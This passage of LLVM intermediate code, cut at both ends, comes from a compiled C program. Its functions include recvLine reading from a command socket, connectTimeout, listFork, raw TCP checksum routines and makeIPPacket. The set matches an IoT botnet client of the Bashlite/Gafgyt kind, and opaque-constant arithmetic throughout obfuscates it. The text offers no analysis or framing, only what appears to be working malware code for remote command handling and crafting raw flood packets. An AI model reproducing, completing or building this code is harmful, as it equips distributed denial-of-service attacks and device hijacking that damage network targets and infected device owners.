  %121 = load i32, i32* %20, align 4
  %122 = load i8**, i8*** %9, align 8
  %123 = load i8*, i8** %17, align 8
  %124 = load i32, i32* %13, align 4
  %125 = load i32, i32* %14, align 4
  %126 = call i32 @prints(i8** %122, i8* %123, i32 %124, i32 %125)
  %127 = sub i32 0, %121
  %128 = sub i32 0, %126
  %129 = add i32 %127, %128
  %130 = sub i32 0, %129
  %131 = add nsw i32 %121, %126
  store i32 %130, i32* %8, align 4
  br label %132

; <label>:132:                                    ; preds = %120, %25
  %133 = load i32, i32* %8, align 4
  ret i32 %133
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, 1845408391
  %14 = add i32 %13, 65
  %15 = add i32 %14, 1845408391
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #6, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 8020462678646300398, -1
  %47 = and i64 %44, 8020462678646300398
  %48 = and i64 %43, %46
  %49 = and i64 %45, 8020462678646300398
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 8020462678646300398, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 %60, 151889488
  %62 = add i32 %61, 1
  %63 = add i32 %62, 151889488
  %64 = add nsw i32 %60, 1
  %65 = call i32 @select(i32 %63, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %65, i32* %12, align 4
  %66 = icmp sle i32 %65, 0
  br i1 %66, label %67, label %114

; <label>:67:                                     ; preds = %33
  br label %68

; <label>:68:                                     ; preds = %105, %67
  %69 = load i32, i32* %13, align 4
  %70 = icmp slt i32 %69, 10
  br i1 %70, label %71, label %113

; <label>:71:                                     ; preds = %68
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %71
  %75 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 0
  %77 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %76) #6, !srcloc !2
  %78 = extractvalue { i64, i64* } %77, 0
  %79 = extractvalue { i64, i64* } %77, 1
  %80 = trunc i64 %78 to i32
  store i32 %80, i32* %14, align 4
  %81 = ptrtoint i64* %79 to i64
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  br label %83

; <label>:83:                                     ; preds = %74
  %84 = load i32, i32* %5, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %88 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %89 = load i32, i32* %5, align 4
  %90 = sdiv i32 %89, 64
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 %91
  %93 = load i64, i64* %92, align 8
  %94 = and i64 %93, %87
  %95 = xor i64 %93, %87
  %96 = or i64 %94, %95
  %97 = or i64 %93, %87
  store i64 %96, i64* %92, align 8
  %98 = load i32, i32* %5, align 4
  %99 = sub i32 %98, -110952087
  %100 = add i32 %99, 1
  %101 = add i32 %100, -110952087
  %102 = add nsw i32 %98, 1
  %103 = call i32 @select(i32 %101, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %103, i32* %12, align 4
  %104 = icmp sle i32 %103, 0
  br i1 %104, label %105, label %112

; <label>:105:                                    ; preds = %83
  %106 = load i32, i32* %13, align 4
  %107 = sub i32 0, %106
  %108 = sub i32 0, 1
  %109 = add i32 %107, %108
  %110 = sub i32 0, %109
  %111 = add nsw i32 %106, 1
  store i32 %110, i32* %13, align 4
  br label %68

; <label>:112:                                    ; preds = %83
  br label %113

; <label>:113:                                    ; preds = %112, %68
  br label %114

; <label>:114:                                    ; preds = %113, %33
  store i32 0, i32* %18, align 4
  %115 = load i8*, i8** %6, align 8
  store i8* %115, i8** %17, align 8
  br label %116

; <label>:116:                                    ; preds = %136, %114
  %117 = load i32, i32* %7, align 4
  %118 = sub i32 0, -1
  %119 = sub i32 %117, %118
  %120 = add nsw i32 %117, -1
  store i32 %119, i32* %7, align 4
  %121 = icmp sgt i32 %117, 1
  br i1 %121, label %122, label %142

; <label>:122:                                    ; preds = %116
  %123 = load i32, i32* @mainCommSock, align 4
  %124 = call i64 @recv(i32 %123, i8* %16, i64 1, i32 0)
  %125 = icmp ne i64 %124, 1
  br i1 %125, label %126, label %128

; <label>:126:                                    ; preds = %122
  %127 = load i8*, i8** %17, align 8
  store i8 0, i8* %127, align 1
  store i32 -1, i32* %4, align 4
  br label %145

; <label>:128:                                    ; preds = %122
  %129 = load i8, i8* %16, align 1
  %130 = load i8*, i8** %17, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %17, align 8
  store i8 %129, i8* %130, align 1
  %132 = load i8, i8* %16, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 10
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %128
  br label %142

; <label>:136:                                    ; preds = %128
  %137 = load i32, i32* %18, align 4
  %138 = add i32 %137, -1668131777
  %139 = add i32 %138, 1
  %140 = sub i32 %139, -1668131777
  %141 = add nsw i32 %137, 1
  store i32 %140, i32* %18, align 4
  br label %116

; <label>:142:                                    ; preds = %135, %116
  %143 = load i8*, i8** %17, align 8
  store i8 0, i8* %143, align 1
  %144 = load i32, i32* %18, align 4
  store i32 %144, i32* %4, align 4
  br label %145

; <label>:145:                                    ; preds = %142, %126
  %146 = load i32, i32* %4, align 4
  ret i32 %146
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #9
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %127

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %111

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #9
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %109

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #6, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = xor i64 %76, -1
  %78 = xor i64 %70, -1
  %79 = xor i64 -3844857672838699535, -1
  %80 = and i64 %77, -3844857672838699535
  %81 = and i64 %76, %79
  %82 = and i64 %78, -3844857672838699535
  %83 = and i64 %70, %79
  %84 = or i64 %80, %81
  %85 = or i64 %82, %83
  %86 = xor i64 %84, %85
  %87 = or i64 %77, %78
  %88 = xor i64 %87, -1
  %89 = or i64 -3844857672838699535, %79
  %90 = and i64 %88, %89
  %91 = or i64 %86, %90
  %92 = or i64 %76, %70
  store i64 %91, i64* %75, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  %97 = call i32 @select(i32 %95, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %100 = load i32, i32* %6, align 4
  %101 = bitcast i32* %14 to i8*
  %102 = call i32 @getsockopt(i32 %100, i32 1, i32 4, i8* %101, i32* %13) #6
  %103 = load i32, i32* %14, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %99
  store i32 0, i32* %5, align 4
  br label %127

; <label>:106:                                    ; preds = %99
  br label %108

; <label>:107:                                    ; preds = %66
  store i32 0, i32* %5, align 4
  br label %127

; <label>:108:                                    ; preds = %106
  br label %110

; <label>:109:                                    ; preds = %48
  store i32 0, i32* %5, align 4
  br label %127

; <label>:110:                                    ; preds = %108
  br label %111

; <label>:111:                                    ; preds = %110, %40
  %112 = load i32, i32* %6, align 4
  %113 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null)
  %114 = sext i32 %113 to i64
  store i64 %114, i64* %15, align 8
  %115 = load i64, i64* %15, align 8
  %116 = xor i64 %115, -1
  %117 = xor i64 -2049, -1
  %118 = xor i64 4741410664001751619, -1
  %119 = or i64 %116, %117
  %120 = or i64 4741410664001751619, %118
  %121 = xor i64 %119, -1
  %122 = and i64 %121, %120
  %123 = and i64 %115, -2049
  store i64 %122, i64* %15, align 8
  %124 = load i32, i32* %6, align 4
  %125 = load i64, i64* %15, align 8
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 4, i64 %125)
  store i32 1, i32* %5, align 4
  br label %127

; <label>:127:                                    ; preds = %111, %109, %107, %105, %39
  %128 = load i32, i32* %5, align 4
  ret i32 %128
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %59

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, 1
  %13 = sub i64 %11, %12
  %14 = add i64 %11, 1
  store i64 %13, i64* @numpids, align 8
  %15 = load i64, i64* @numpids, align 8
  %16 = sub i64 0, 1
  %17 = sub i64 %15, %16
  %18 = add i64 %15, 1
  %19 = mul i64 %17, 4
  %20 = call noalias i8* @malloc(i64 %19) #6
  %21 = bitcast i8* %20 to i32*
  store i32* %21, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %22

; <label>:22:                                     ; preds = %40, %10
  %23 = load i32, i32* %4, align 4
  %24 = zext i32 %23 to i64
  %25 = load i64, i64* @numpids, align 8
  %26 = sub i64 0, 1
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 1
  %29 = icmp ult i64 %24, %27
  br i1 %29, label %30, label %46

; <label>:30:                                     ; preds = %22
  %31 = load i32*, i32** @pids, align 8
  %32 = load i32, i32* %4, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = load i32*, i32** %3, align 8
  %37 = load i32, i32* %4, align 4
  %38 = zext i32 %37 to i64
  %39 = getelementptr inbounds i32, i32* %36, i64 %38
  store i32 %35, i32* %39, align 4
  br label %40

; <label>:40:                                     ; preds = %30
  %41 = load i32, i32* %4, align 4
  %42 = sub i32 %41, -499533733
  %43 = add i32 %42, 1
  %44 = add i32 %43, -499533733
  %45 = add i32 %41, 1
  store i32 %44, i32* %4, align 4
  br label %22

; <label>:46:                                     ; preds = %22
  %47 = load i32, i32* %2, align 4
  %48 = load i32*, i32** %3, align 8
  %49 = load i64, i64* @numpids, align 8
  %50 = add i64 %49, 4775246379496103746
  %51 = sub i64 %50, 1
  %52 = sub i64 %51, 4775246379496103746
  %53 = sub i64 %49, 1
  %54 = getelementptr inbounds i32, i32* %48, i64 %52
  store i32 %47, i32* %54, align 4
  %55 = load i32*, i32** @pids, align 8
  %56 = bitcast i32* %55 to i8*
  call void @free(i8* %56) #6
  %57 = load i32*, i32** %3, align 8
  store i32* %57, i32** @pids, align 8
  %58 = load i32, i32* %2, align 4
  store i32 %58, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %46, %8
  %60 = load i32, i32* %1, align 4
  ret i32 %60
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 5485342271943581680
  %16 = add i64 %15, %13
  %17 = add i64 %16, 5485342271943581680
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, -1085178818
  %21 = sub i32 %20, 2
  %22 = add i32 %21, -1085178818
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = add i64 %32, -6543774968743983417
  %34 = add i64 %33, %31
  %35 = sub i64 %34, -6543774968743983417
  %36 = add i64 %32, %31
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %27, %24
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %54

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 65535, -1
  %45 = xor i64 %43, %44
  %46 = and i64 %45, %43
  %47 = and i64 %43, 65535
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 16
  %50 = sub i64 %46, -3852675116786951143
  %51 = add i64 %50, %49
  %52 = add i64 %51, -3852675116786951143
  %53 = add i64 %46, %49
  store i64 %52, i64* %5, align 8
  br label %38

; <label>:54:                                     ; preds = %38
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = and i64 -1, %56
  %58 = xor i64 -1, -1
  %59 = and i64 %55, %58
  %60 = or i64 %57, %59
  %61 = xor i64 %55, -1
  %62 = trunc i64 %60 to i16
  ret i16 %62
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 19, -1
  %21 = and i8 %18, 19
  %22 = and i8 %16, %20
  %23 = and i8 %19, 19
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 19, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 15, -1
  %38 = xor i8 %36, %37
  %39 = and i8 %38, %36
  %40 = and i8 %36, 15
  %41 = and i8 %39, 64
  %42 = xor i8 %39, 64
  %43 = or i8 %41, %42
  %44 = or i8 %39, 64
  store i8 %43, i8* %35, align 4
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 1
  store i8 0, i8* %46, align 1
  %47 = load i32, i32* %10, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, %48
  %50 = sub i64 20, %49
  %51 = add i64 20, %48
